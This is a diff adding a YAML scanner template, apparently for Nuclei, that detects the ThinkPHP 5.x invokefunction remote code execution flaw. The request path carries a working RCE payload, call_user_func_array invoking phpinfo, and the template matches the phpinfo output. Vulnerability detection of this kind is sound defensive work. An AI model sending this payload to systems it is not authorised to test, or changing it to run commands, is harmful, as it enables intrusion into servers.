@@ -1,0 +1,25 @@
+id: thinkphp-invokefunction-detect
+
+info:
+  name: ThinkPHP 5.x invokefunction Detection (phpinfo)
+  author: 72stack-sec
+  severity: critical
+  description: ThinkPHP 5.x invokefunction RCE detection using the non-destructive phpinfo variant. Source payload: playbooks/rce/10-framework.md (thinkphp-rce).
+  reference:
+    - https://github.com/Little-H-lying-flat/72stack-sec
+  tags: thinkphp,rce,detect
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
+    matchers:
+      - type: word
+        words:
+          - "DOCUMENT_ROOT"
+          - "Configuration File (php.ini) Path"
+        condition: and
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
